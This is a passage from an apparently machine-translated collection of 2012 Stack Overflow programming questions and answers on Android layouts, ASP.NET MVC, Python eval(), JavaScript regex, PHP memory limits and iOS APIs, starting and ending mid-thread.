如果您看一下图像，“连接”、“命令”和“会话”任务将各有一个数据流。如您所见，合并任务将处理两个流，因此您可以通过这种方式预处理数据。（就像你想要一个初始表一样。但这将是并行的！）

如果我说对了，您只是想查找一下。看看[这里](http://msdn.microsoft.com/en-us/library/ms141821.aspx)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T22:35:00.427

如果我很好理解你：

1.  您需要在其中插入数据`TABLE A`
2.  当您在`TABLE B`使用[LOOKUP](http://www.bidn.com/blogs/SMcDonald/bidn-blog/621/ssis-lookup-task)元素中插入数据以从中获取密钥时`TABLE A`。

# java - 使用 Jexcel 打开 Excel

> ID：13491558
> 
> 赞同：0
> 
> 时间：2012-11-21T10:47:03.093
> 
> 标签：java, jframe, jexcelapi

嗨，伙计们，我正在尝试使用此代码在 JFrame 中显示一个 excel 工作表页面

```
 JFrame frame = new JFrame();
    Container cp = frame.getContentPane();
    cp.setLayout(new BorderLayout());
     File workbookFile = new File("C:\\Workbook.xls");         

    //Opening the specified file in the JWorkbook component
    JWorkbook jWorkbook = new JWorkbook(workbookFile); 
    cp.add(jWorkbook); 
```

但我收到错误：

```
Exception in thread "main" java.lang.NoClassDefFoundError: com/jniwrapper/win32/automation/OleContainer
at excel.open.ExcelOpen.main(ExcelOpen.java:29)
Caused by: java.lang.ClassNotFoundException: com.jniwrapper.win32.automation.OleContainer
at java.net.URLClassLoader$1.run(URLClassLoader.java:366)
at java.net.URLClassLoader$1.run(URLClassLoader.java:355)
at java.security.AccessController.doPrivileged(Native Method)
at java.net.URLClassLoader.findClass(URLClassLoader.java:354)
at java.lang.ClassLoader.loadClass(ClassLoader.java:423)
at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:308)
at java.lang.ClassLoader.loadClass(ClassLoader.java:356)
... 1 more
Java Result: 1 
```

我的 ClassPath 中有以下 Jar：jexcel-1.5.23878.jar。请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T13:07:55.867

还需要将[ComfyJ](http://www.teamdev.com/comfyj/)添加到您的类路径中，它将超越此错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-21T11:55:35.663

您还应该将 comfyj-xxjar 添加到类路径中。

# android - AdMob“空间不足，无法展示广告”错误

> ID：13491560
> 
> 赞同：4
> 
> 时间：2012-11-21T10:47:06.863
> 
> 标签：android, android-layout, android-emulator, admob

我是安卓新手。通过在 main.xml 中进行以下更改，我在我的 android 应用中添加了 AdMob：

```
<?xml version="1.0" encoding="utf-8"?>
<TabHost xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@android:id/tabhost"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

    <LinearLayout
        xmlns:ads="http://schemas.android.com/apk/lib/com.google.ads"
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:orientation="vertical" >
        <TabWidget
            android:id="@android:id/tabs"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content" />

        <FrameLayout
            android:id="@android:id/tabcontent"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent" />

        <com.google.ads.AdView
            xmlns:ads="http://schemas.android.com/apk/lib/com.google.ads"
            android:id="@+id/adView"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            ads:adSize="BANNER"
            ads:adUnitId="XXXXXXXXX"
            ads:loadAdOnCreate="true" />
    </LinearLayout>
</TabHost> 
```

我的项目成功运行，没有错误，但我没有收到广告。

```
WARN/Ads(3805): Not enough space to show ad! Wants: <320, 50>, Has: <320, 0>. 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-21T10:50:03.813

这意味着没有空间在您的布局中显示广告。将其更改为 RelativeLayout 并对齐父底部。

```
<RelativeLayout
            xmlns:ads="http://schemas.android.com/apk/lib/com.google.ads"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            >
        <TabWidget
                android:id="@android:id/tabs"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content" />
        <FrameLayout
                android:id="@android:id/tabcontent"
                android:layout_width="fill_parent"
                android:layout_height="fill_parent"
                android:layout_below="@android:id/tabs"/>

    <com.google.ads.AdView
            xmlns:ads="http://schemas.android.com/apk/lib/com.google.ads"
            android:id="@+id/adView"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:layout_alignParentBottom="true"
            ads:adSize="BANNER"
            ads:adUnitId="XXXXXXXXX"
            ads:loadAdOnCreate="true" 
            />
</RelativeLayout> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:52:40.147

这导致了这个问题。

```
 <FrameLayout
            android:id="@android:id/tabcontent"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent" /> 
```

您的 FrameLayout 占据了视图上的所有高度。因此，即使您在 FrameLayout 下方编写 AdView，它的高度也为 0。

考虑在 FrameLayout 中的运行时包括 AdMob。

# android - TableLayout中按钮的多个onClick

> ID：13491562
> 
> 赞同：1
> 
> 时间：2012-11-21T10:47:12.407
> 
> 标签：android, android-tablelayout

我有一个表格布局，其中显示的值如下：

![在此处输入图像描述](../Images/bf25049bff088e9c221124050c67a6af.png)

现在我能够实现对行的点击，但我在每行中有三个按钮。

单击开始、已完成和已交付时，我需要更新 mysql 表中的列（状态）。
如果它只是一个表格行，我们可以这样做：

```
tr.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View pos) {
                // TODO Auto-generated method stub

                System.out.println("Row clicked: " + pos.getId());
            }
        }); 
```

下面是我的表格布局代码：

```
/*******getting values from mysql db  and assigning it to teach row***********/
try{
            allarray = new JSONArray(result);
            System.out.println("array is " +allarray.length());
            JSONObject json_data=null;
                for(int j=0;j<allarray.length();j++){
                json_data = allarray.getJSONObject(j);
                json_data.getString("PreparationLot");
                json_data.getString("Prep_MenuItem");
                json_data.getString("Prep_Quantity");
                json_data.getString("Prep_Order_Number");
                json_data.getString("Prep_Notes");

                TableLayout tl = (TableLayout) findViewById(R.id.tableLayout1);

                TableRow tr = new TableRow(DashBoard.this);
                if(count%2!=0) {
                    tr.setBackgroundColor(Color.rgb(222, 219, 219));
                }else{
                    tr.setBackgroundColor(Color.rgb(255, 255, 255));
                }
                tr.setId(20);
                tr.setLayoutParams(new LayoutParams());

                TextView lotno = new TextView(DashBoard.this);
                lotno.setId(200+count);// define id that must be unique
                lotno.setText(""+json_data.getString("PreparationLot")); // set the text for the header 
                lotno.setTextColor(Color.BLACK); // set the color
                lotno.setPadding(10, 10, 0, 10); // set the padding (if required)
                lotno.setTextSize(18);
                tr.addView(lotno);

                TextView itemname = new TextView(DashBoard.this);
                itemname.setId(200+count);// define id that must be unique
                itemname.setText(""+json_data.getString("Prep_MenuItem")); // set the text for the header 
                itemname.setTextColor(Color.BLACK); // set the color
                itemname.setPadding(30, 10, 0, 10); // set the padding (if required)
                itemname.setTextSize(18);
                tr.addView(itemname);

                TextView qty = new TextView(DashBoard.this);
                qty.setId(200+count);// define id that must be unique
                qty.setText(""+json_data.getString("Prep_Quantity")); // set the text for the header 
                qty.setTextColor(Color.BLACK); // set the color
                qty.setPadding(70, 10, 0, 10); // set the padding (if required)
                qty.setTextSize(18);
                tr.addView(qty);

                TextView order = new TextView(DashBoard.this);
                order.setId(200+count);// define id that must be unique
                order.setText(""+json_data.getString("Prep_Order_Number")); // set the text for the header 
                order.setTextColor(Color.BLACK); // set the color
                order.setPadding(60, 10, 0, 10); // set the padding (if required)
                order.setTextSize(18);
                tr.addView(order);

                TextView notes = new TextView(DashBoard.this);
                notes.setId(200+count);// define id that must be unique
                notes.setText(""+json_data.getString("Prep_Notes")); // set the text for the header 
                notes.setTextColor(Color.BLACK); // set the color
                notes.setPadding(60, 10, 0, 10); // set the padding (if required)
                notes.setTextSize(18);
                tr.addView(notes);

                Button start = new Button(DashBoard.this);
                start.setText("Start");
                start.setMaxWidth(10);
                tr.addView(start); 

                Button complete = new Button(DashBoard.this);
                complete.setText("Complete");
                complete.setMaxWidth(10);
                tr.addView(complete); 

                Button delivered = new Button(DashBoard.this);
                delivered.setText("Delivered");
                delivered.setMaxWidth(10);
                tr.addView(delivered); 

                tl.addView(tr, new TableLayout.LayoutParams(
                        LayoutParams.FILL_PARENT,
                        LayoutParams.WRAP_CONTENT));

           count++;
           tr.setClickable(true);
           tr.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View pos) {
                // TODO Auto-generated method stub
            //  Toast.makeText(DashBoard.this, v.getId(), 1000).show();
                System.out.println("Row clicked: " + pos.getId());
            }
        });
                }
            }
            catch(JSONException e1){
                    Toast.makeText(getBaseContext(), "No data Found" ,Toast.LENGTH_LONG).show();
            } 
```

**问题：** *如果我单击开始、已完成或已交付，我需要更新该行的状态。怎么做？*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:54:05.700

您将需要为行中的每个项目添加 onclicklistners，而不是行本身。

```
Button start = new Button(DashBoard.this);
start.setText("Start");
start.setMaxWidth(10);
start.setOnClickListener(new OnClickListener() {

     @Override
      public void onClick(View pos) {
                       // update fields for start
                       // your code for update your status of the row
      }
      });
tr.addView(start); 

Button complete = new Button(DashBoard.this);
complete.setText("Complete");
complete.setMaxWidth(10);
complete.setOnClickListener(new OnClickListener() {

     @Override
      public void onClick(View pos) {
                       // update fields for complete
                       // your code for update your status of the row
      }
      });

tr.addView(complete); 

Button delivered = new Button(DashBoard.this);
delivered.setText("Delivered");
delivered.setMaxWidth(10);
delivered.setOnClickListener(new OnClickListener() {

     @Override
      public void onClick(View pos) {
                       // update fields for delivered
                       // your code for update your status of the row
      }
      });

tr.addView(delivered); 
```

编辑：添加了另外 2 个 onclicklistners 并添加了一些评论

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T11:17:19.303

> 问题：如果我单击开始、已完成或已交付，我需要更新该行的状态。怎么做？

首先，我不知道您对更新行的状态有何理解。如果您想“查看”任何创建单个`Buttons`中的任何一个的单击事件：`TableRows``OnCLickListener`

```
private OnClickListener mListener = new OnClickListener() {

    @Override
    public void onClick(View v) {
        TableRow tr = (TableRow) v.getParent();
        // now you have a reference to the row where this Button that was
        // clicked exists
        // do whatever row updates you want.
    }
}; 
```

这`mListener` 将设置为每个`TableRow`'s `Buttons`：

```
 //...
            Button start = new Button(DashBoard.this);
            start.setOnClickListener(mListener); 
            start.setText("Start");
            start.setMaxWidth(10);
            tr.addView(start); 

            Button complete = new Button(DashBoard.this);
            complete.setOnClickListener(mListener);
            complete.setText("Complete");
            complete.setMaxWidth(10);
            tr.addView(complete); 

            Button delivered = new Button(DashBoard.this);
            delivered.setOnClickListener(mListener);
            delivered.setText("Delivered");
            delivered.setMaxWidth(10);
            tr.addView(delivered); 
```

# asp.net-mvc-3 - 按类别显示数据

> ID：13491566
> 
> 赞同：-1
> 
> 时间：2012-11-21T10:47:38.397
> 
> 标签：asp.net-mvc-3, c#-4.0

我有一个名为类别的列表。它包含以下数据。

```
Name  -                  Id 
----------------------------
Mobile  -                 0
Cellphones -             21
Mobile Accessories -     22
Camera -                  0
Camcorder -              55
Camera Accessories       60
SLRs                     61
Photo Printers           63
Computers                0
Laptops                  65
Memory Cards             67
Monitors                 69
RAM                      70
Computer Accessories     71 
```

我想使用 Ul 和 Li 标签按以下方式显示上述数据：

**移动的**

-手机

-手机配件

**相机**

-摄像机

-相机配件

-单反

-照片打印机

**电脑**

-笔记本电脑

-记忆卡

-显示器

-内存

-电脑配件

即 id=0 表示父类，id=非零表示子类

帮助我。在此先感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T02:30:17.410

```
Namespace Test

Public Class Class1

    Dim Categories As List(Of Category) = New List(Of Category) _
                                          From {New Category With {
                                                .ID = 0, .Name = "Mobile",
                                                .Items = New List(Of CategoryItem) _
                                                    From {New CategoryItem With {.ID = 1, .Name = "Cellphones"},
                                                          New CategoryItem With {.ID = 2, .Name = "Mobile Accessories"}
                                                         }
                                                },
                                                New Category With {
                                                .ID = 1, .Name = "Camera",
                                                .Items = New List(Of CategoryItem) _
                                                    From {New CategoryItem With {.ID = 1, .Name = "Camcorder"},
                                                          New CategoryItem With {.ID = 2, .Name = "Camera Accessories"},
                                                          New CategoryItem With {.ID = 3, .Name = "SLRs"},
                                                          New CategoryItem With {.ID = 4, .Name = "Photo Printers"}
                                                         }
                                                },
                                                New Category With {
                                                .ID = 2, .Name = "Computers",
                                                .Items = New List(Of CategoryItem) _
                                                    From {New CategoryItem With {.ID = 1, .Name = "Laptops"},
                                                          New CategoryItem With {.ID = 2, .Name = "Memory Cards"},
                                                          New CategoryItem With {.ID = 3, .Name = "Monitors"},
                                                          New CategoryItem With {.ID = 4, .Name = "RAM"},
                                                          New CategoryItem With {.ID = 5, .Name = "Computer Accessories"}
                                                         }
                                                }
                                                }

    Public Sub New()
     Dim ul As String =  SetCategories()
    End Sub

    Private Function SetCategories() As String
        Dim ulCategories As XElement = <ul class="float-left"></ul>

        For Each cat As Category In Categories
            Dim currentCategory As Category = cat
            Dim liCategory As XElement = <li><%= currentCategory.Name %></li>
            Dim ulCategoryItems As XElement = <ul></ul>
            For Each item As CategoryItem In currentCategory.Items
                Dim currentItem As CategoryItem = item
                Dim liItem As XElement = <li><%= currentItem.Name %></li>
                ulCategoryItems.Add(liItem)
            Next item
            liCategory.Add(ulCategoryItems)
            ulCategories.Add(liCategory)
        Next cat

        Return ulCategories.ToString()

    End Function

End Class

Public Class Category

    Public Property ID As Integer
    Public Property Name As String
    Public Property Items As List(Of CategoryItem)

End Class

Public Class CategoryItem
    Public Property ID As Integer
    Public Property Name As String
End Class

End Namespace 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T03:23:22.863

在这里，把它放在你的视野中：

```
<ul>
    <li>Mobile
      <ul>
          <li>Cellphones</li>
          <li>Mobile Accessories</li>
      </ul>
    </li>    
    <li>Camera
      <ul>
          <li>Camcorder</li>
          <li>Camera Accessories</li>
          <li>SLRs</li>
          <li>Photo Printers</li>
      </ul>
    </li>    
    <li>Computers
      <ul>
          <li>Laptops</li>
          <li>Memory Cards</li>
          <li>Monitors</li>
          <li>RAM</li>
          <li>Computer Accessories</li>
      </ul>
    </li>    
</ul> 
```

* * *

虽然这就是你所要求的，但我认为你想要更多的东西。

由于您的问题或您的任何尝试没有任何具体内容，因此在以下解决方案中做出了几个假设。

班级：

```
public class Category
{
  public int Id { get; set; }
  public string Name { get; set; }
  public List<Category> Subcateogries { get; set; }

  public Category()
  {
    Subcateogries = new List<Category>();
  }
} 
```

控制器：

```
public ActionResult Index()
{
  //The Data
  var categories = new List<Category>
  {
    new Category { Id = 0, Name = "Mobile" },
    new Category { Id = 21, Name = "Cellphones" },
    new Category { Id = 22, Name = "Mobile Accessories" },
    new Category { Id = 0, Name = "Camera" },
    new Category { Id = 55, Name = "Camcorder" },
    new Category { Id = 60, Name = "Camera Accessories" },
    new Category { Id = 61, Name = "SLRs" },
    new Category { Id = 63, Name = "Photo Printers" },
    new Category { Id = 0, Name = "Computers" },
    new Category { Id = 65, Name = "Laptops" },
    new Category { Id = 67, Name = "Memory Cards" },
    new Category { Id = 69, Name = "Monitors" },
    new Category { Id = 70, Name = "RAM" },
    new Category { Id = 71, Name = "Computer Accessories" }
  };

  var GroupedData = new List<Category>();

  foreach(var category in categories)
  {
    if(category.Id == 0)
    {
      GroupedData.Add(category);
    }
    else
    {
      GroupedData.Last().Subcateogries.Add(category);
    }
  }

  return View(GroupedData);
} 
```

看法：

```
@model List<Category>

<h2>Categories</h2>

<ul>
  @foreach (var topCategory in Model)
  {
    <li>@topCategory.Name
      <ul>
        @foreach (var subCategory in topCategory.Subcateogries)
        {
          <li>@subCategory.Name</li>
        }
      </ul>
    </li>    
  }
</ul> 
```

这是假设起始列表（在这种情况下为**类别**）是您想要的顺序。**在创建GroupedData**时，我还通过重用原始列表项来走捷径。还假设永远只有两个级别。

可以重构视图以利用部分视图并处理多个级别，但这不是问题的一部分。

# python - eval() 函数如何改变字典？

> ID：13491571
> 
> 赞同：2
> 
> 时间：2012-11-21T10:48:14.457
> 
> 标签：python, dictionary, python-3.x, eval

eval() 如何改变字典？这是一个例子：创建一个 dict -> print -> eval -> print

```
>>> a={'a':'a','b':'b'}
>>> print(a)
{'a': 'a', 'b': 'b'}
>>> eval('a == "a"',a)
True
>>> print(a)
{'a': 'a', '__builtins__': {'bytearray': <class 'bytearray'>, 'IndexError': <class 'IndexError'>, 'all': <built-in function all>, 'help': Type help() for interactive help, or help(object) for help about object., 'vars': <built-in function vars>, 'SyntaxError': <class 'SyntaxError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'memoryview': <class 'memoryview'>, 'isinstance': <built-in function isinstance>, '__build_class__': <built-in function __build_class__>, 'copyright': Copyright (c) 2001-2012 Python Software Foundation.
All Rights Reserved.
... 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-21T10:52:54.860

to 的第二个参数[`eval()`](http://docs.python.org/2/library/functions.html#eval)是用于表达式 run by 的全局变量`eval()`。

python 在评估表达式时所做的一件事是确保 python 内置函数可用于评估的表达式，并为此*将*`__builtins__`条目添加到该全局命名空间。

所以，是的，这个`eval()`电话确实改变了你的字典，这是预期的正常行为。它甚至在函数的文档中这样说：

> 如果*全局*字典存在并且缺少'__builtins__'，则在解析*表达式*之前将当前全局变量复制到*全局变量中。*这意味着*表达式*通常可以完全访问标准模块并且传播受限环境。**[`__builtin__`](http://docs.python.org/2/library/__builtin__.html#module-__builtin__)**

 **如果要*避免*`dict`此更改，请为全局变量使用空值，并改为`a`用作`locals`命名空间：

```
eval('a == "a"', {}, a) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T10:53:55.137

答案在[文档](http://docs.python.org/2/library/functions.html#eval)中！

首先，to的第二个参数`eval`是`global`字典。比，我们看到：

> 如果全局字典存在并且缺少'__builtins__'，则在解析表达式之前将当前全局变量复制到全局变量中。

所以是的，你的字典被调用修改了`eval`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:50:05.753

是的，它确实。第二个参数`eval()`是“全局”字典，它解释了你所看到的。**

# asp.net-mvc - 我在 asp.net-mvc 中的哪个位置放置用户身份验证代码？

> ID：13491575
> 
> 赞同：0
> 
> 时间：2012-11-21T10:48:21.023
> 
> 标签：asp.net-mvc, redirect, authentication

我正在开发一个带有 Windows 身份验证的 MVC 内部网。

我有一个文件夹，其中包含只有某些角色才能看到的视图。

我在那个文件夹中有一个 web.config 文件

```
<?xml version="1.0"?>
<configuration>
    <system.web>
      <authorization>
        <allow roles="Administrator, ICCManager"/>
        <deny users="*"/>
      </authorization>
    </system.web>
</configuration> 
```

我想编写代码来查看用户是否处于这些角色之一，如果没有将他重定向到信息页面。

这是我的第一个 MVC 项目，但我仍然不完全了解我的方式。所以我不知道在哪里实际编写这段代码。有点傻，我知道，但我还是不明白。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:53:26.597

您不必直接配置对视图的访问，您可以配置对将返回视图的操作方法的访问。

您可以通过使用 [Authorize] 属性装饰单个操作方法或整个控制器来做到这一点：

```
// All actions in this class cannot be called by anonymous users
[Authorize]
public class MyController {

    // This action is just callable by users in role Admin
    [Authorize(Roles="Admin")]
    public ActionResult MyAction() {
        return View();
    }

    // This action is callable by any authorized user (inherited from class)
    public ActionResult MyAction() {
        return View();
    }
}

// Actions from this controller can be called by any user (even unauthorized)
public calls AnotherController {
} 
```

当不允许的用户尝试访问页面时，用户将被重定向到您在 web.config`loginUrl`中元素的属性中配置的操作：`authentication`

```
<authentication mode="Forms">
    <forms loginUrl="~/Membership/Login" ... />
</authentication> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:58:36.280

在控制器方法上使用[AuhtorizeAttribute](http://msdn.microsoft.com/ru-ru/library/system.web.mvc.authorizeattribute%28v=vs.108%29.aspx#using_authorizeattribute)设置对操作的限制，并在 web.config 中在身份验证标签中设置表单身份验证并将登录页面设置为您需要的页面。如果不是登录页面而只是信息，请打开 global.asax 并覆盖 Application_AuthenticateRequest 方法。

```
protected void Application_AuthenticateRequest(Object sender, EventArgs e)
{
        if (User.Identity.IsAuthenticated)
        {
            //redirect
        }       
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T10:50:54.417

这可能是一个很好的起点：

[http://theintegrity.co.uk/2010/11/asp-net-mvc-2-custom-membership-provider-tutorial-part-1/](http://theintegrity.co.uk/2010/11/asp-net-mvc-2-custom-membership-provider-tutorial-part-1/)

您将希望实现一个成员资格提供程序，它可以确定用户具有哪些角色等。非常可定制。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-21T10:52:22.963

检查特定用户数据库中记录的代码将在`model`类中，您可以将结果从那里返回给控制器。

在`controller`你可以处理逻辑，比如如果用户没有被授权而不是将他重定向到信息页面，或者将他重定向到个人资料页面等。

欲了解更多信息，请阅读此内容，这将有助于清除有关 ASP MVC 的许多其他概念。

[ASP.NET MVC 教程](http://www.w3schools.com/aspnet/mvc_intro.asp)

# android - 如何将一个xml文件导入另一个

> ID：13491579
> 
> 赞同：0
> 
> 时间：2012-11-21T10:48:32.963
> 
> 标签：android, android-layout

我有一个 main.xml 文件和一个 cell_shape.xml 文件。

在我的 main.XML 中我有这个

```
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="wrap_content"
android:layout_height="fill_parent"
android:weightSum="100" >

<include
    android:id="tables"
    layout="@layout/cell_shape" /> 
```

在我的 cell_shape.XML 我有这个

```
 <?xml version="1.0" encoding="utf-8"?>
   <shape xmlns:android="http://schemas.android.com/apk/res/android"
  android:id="@+id/tables"
    android:shape= "rectangle"  >
        <solid android:color="#000"/>
        <stroke android:width="1dp"  android:color="#ff9"/>
</shape> 
```

我有这个错误

```
Exception raised during rendering: You must specify a valid layout
 reference. The layout ID @layout/cell_shape is not valid. Couldn't
 resolve resource @layout/cell_shape Exception details are logged in
 Window > Show View > Error Log 
```

如果它是我的 main.xml，我不明白如何正确导入

是否有关于如何将不同元素从一个 xml 文件导入到另一个的教程？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:52:40.230

[http://www.xml.com/pub/a/2002/07/31/xinclude.html](http://www.xml.com/pub/a/2002/07/31/xinclude.html)

也许这可以帮助你？我有一个类似的问题，它帮助了我。如果没有……对不起，伙计……没有其他答案

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T12:33:47.167

尝试删除`id`in `include`，所以它看起来就像这样：

```
<include
    layout="@layout/cell_shape" /> 
```

如果它不起作用，请尝试用一种`LinearLayout`或其他类型的布局封闭整个 cell_shape。

顺便说一下，为了 Android 设计的统一性，请使用[这个 Android 网站](http://developer.android.com/design/style/color.html)的颜色。

# iphone - Putting different elements in individual component/wheel of UIPickerView

> ID：13491582
> 
> 赞同：-1
> 
> 时间：2012-11-21T10:48:42.107
> 
> 标签：iphone, ios, uipickerview

```
-(NSString *) pickerView:(UIPickerView *)pickerView titleForRow:(NSInteger)row forComponent:(NSInteger)component
{
    return [pickerArray objectAtIndex:row];
} 
```

pickerArray is the name of the array having the elements which are going to be shown in the UIPickerView.

If my Picker has 3 components, then the upper method fills everyone of them with he same array. How to fill it with different ones ?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:51:51.833

the `component` argument in the call is an integer value indicating que "wheel" that is filling, use something like this:

```
if (component == 0)
    return [pickerArray_0 objectAtIndex:row];
else if (component == 1)
    return [pickerArray_1 objectAtIndex:row];
else
    return [pickerArray_2 objectAtIndex:row]; 
```

# javascript - Javascript 正则表达式最多只能匹配 11 位数字、一个逗号和 2 位数字

> ID：13491589
> 
> 赞同：0
> 
> 时间：2012-11-21T10:48:55.220
> 
> 标签：javascript, jquery, regex

我有一个文本框，我只希望最多允许 11 位数字、一个可选的逗号以及后面的两个数字。将键按下文本框时，不应呈现任何其他内容：

```
$('#txt').keypress(function (e) {
  var code = e.which;
  var key = String.fromCharCode(code);
  // REGEX TO AVOID CHARS & A DOT (.)
  var pattern = /[a-zA-Z]|\./g;
  var isMatch = pattern.test(key);
  if (isMatch) {
    // DO NOT RENDER CHARS & dot
    e.preventDefault();
  }
}); 
```

上面的代码在按下无效键时有效，例如字符或点，但不能确保只有一个逗号和后面的 2 位数字。

这必须匹配：

```
12314
123123,44 
```

这不得：

```
12313,6666 
```

[这](http://jsfiddle.net/d2mRk/12/)是一个演示。

更新：必须避免除数字和逗号之外的任何数字，因此我提出的正则表达式无效，因为只能防止点 (.)。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T11:36:57.063

您应该测试您的完整字符串，而不仅仅是当前字母。

```
$('#txt').keypress(function (e) {
    var key = String.fromCharCode(e.which);
    var pattern=/^[0-9]{1,11}(,[0-9]{0,2})?$/;

    // test this
    var txt = $(this).val() + key;

    if (!pattern.test(txt)) {
        e.preventDefault();
    }
}); 
```

​</p>

[jsfiddle 示例](http://jsfiddle.net/d2mRk/28/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-21T10:54:55.720

这`regex`将匹配任何包含 1 到 11 位数字的字符串，可选地后跟一个`,`2 位数字：`^[0-9]{1,11}(,[0-9]{2})?$`

解释：

```
^             # Match the start of the string
[0-9]{1,11}   # Followed by a maximum of 11 digits
(,[0-9]{2})?  # Optionally followed by a comma and 2 more digits 
$             # Followed by the end of the string 
```

[在这里](http://rubular.com/r/60xWl27BrC)查看它的实际应用。

# php - 大量数据的 PHPExcel 致命错误

> ID：13491592
> 
> 赞同：-1
> 
> 时间：2012-11-21T10:49:07.760
> 
> 标签：php

> **可能重复：**
> [PHP 应用程序用尽内存](https://stackoverflow.com/questions/3847396/php-application-running-out-of-memory)
> [允许的 X 字节内存大小已用完](https://stackoverflow.com/questions/4096582/allowed-memory-size-of-x-bytes-exhausted)

> 在第 942 行的 /home/extremew/public_html/florista/PHPExcel/PHPExcel/Worksheet.php 中允许的内存大小为 33554432 字节（尝试分配 94 字节）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T10:50:49.217

PHP 内存不足，您可以通过增加 php.ini 中的 PHP 内存限制来解决此问题

尝试这个：

`memory_limit 64M`

然后重启apache。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:51:29.823

你必须增加你的 php 内存。有 3 种方法可以做到这一点。

通常提供者不授予 php.ini 权限或禁用 .htacces 中的功能以增加内存。比你只有机会直接在 php 中完成。

* * *

## php.ini

更改此行`memory_limit = 64M`之后，您必须重新启动您的网络服务器。

## 直接php

用于`ini_set('memory_limit', '64M');`设置内存大小。

## .htaccess

添加`php_value memory_limit 64M`到您的文件中。

* * *

**编辑：**更改示例中的值。

**编辑2：**有很多人有同样的问题。请阅读[本文](https://stackoverflow.com/questions/5560053/phpexcel-allowed-memory-size-of-134217728-bytes-exhausted)！

# objective-c - 将浮点数四舍五入到小数点后两位

> ID：13491593
> 
> 赞同：-2
> 
> 时间：2012-11-21T10:49:10.053
> 
> 标签：objective-c, ios

我正在尝试将浮点值四舍五入到小数点后两位。我正在使用objective-c

例如 1.47567 应该是这样 , 1.47 .. 请帮忙

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-21T11:00:19.560

```
 float num = 1.47567;
    num *= 100;
    if(num >= 0) num += 0.5; else num -= 0.5;
    long round = num;
    num = round;
    num /= 100;
    NSLog(@"%.2f",num); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-26T12:40:39.213

```
NSNumberFormatter *formatter = [[NSNumberFormatter alloc] init];  
[formatter setNumberStyle:NSNumberFormatterDecimalStyle];  
[formatter setMaximumFractionDigits:2];

NSString *formattedNumber = [formatter stringFromNumber:@(self.speed)]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T11:13:41.197

```
double value = 1.47567;
double roundedValue = round(value * 100.0) / 100.0; 
```

当然，您可以使用命名常量来代替 100.0。这只是一个演示。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-11-10T19:00:55.313

做这个

```
NSNumberFormatter *formatter = [[NSNumberFormatter alloc] init];  
[formatter setNumberStyle:NSNumberFormatterDecimalStyle];  
[formatter setMaximumFractionDigits:2];

NSString *formattedNumber = [formatter stringFromNumber:@(self.speed)];

float numTwoDecimalDigits = atof([formattedNumber UTF8String]); 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-11-21T10:56:47.643

```
NSLog(@"%.2f", 1.47567); 
```

将四舍五入到小数点后两位。如果你想“切”，有不同的选择。例如：

```
NSLog(@"%.2f", floor(1.47567 * 100) / 100); 
```

# ios - iOs (CoreLocation) - locationManager:didUpdateLocations: 没有按预期工作

> ID：13491594
> 
> 赞同：3
> 
> 时间：2012-11-21T10:49:09.860
> 
> 标签：ios, core-location

我编写了一个简单的 iPhone 应用程序，它可以检索位置信息并简单地显示它们。我想在`distanceTraveled`每次位置变化时增加变量。我的问题是在方法`locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray *)locations`中，`locations.count`总是等于一。我以为每次调用该方法时都会向数组中添加一个元素，但似乎不是那样...

我正在模拟器中运行应用程序（我现在没有设备）。

这是我的代码：

```
// BIDViewController.h

#import <UIKit/UIKit.h>
#import <CoreLocation/CoreLocation.h>

@interface BIDViewController : UIViewController <CLLocationManagerDelegate>

@property (strong, nonatomic) CLLocationManager *locationManager;
@property (strong, nonatomic) CLLocation *startingPoint;

@property (strong, nonatomic) IBOutlet UILabel *latitudeLabel;
@property (strong, nonatomic) IBOutlet UILabel *longitudeLabel;
@property (strong, nonatomic) IBOutlet UILabel *horizontalAccuracyLabel;
@property (strong, nonatomic) IBOutlet UILabel *altitudeLabel;
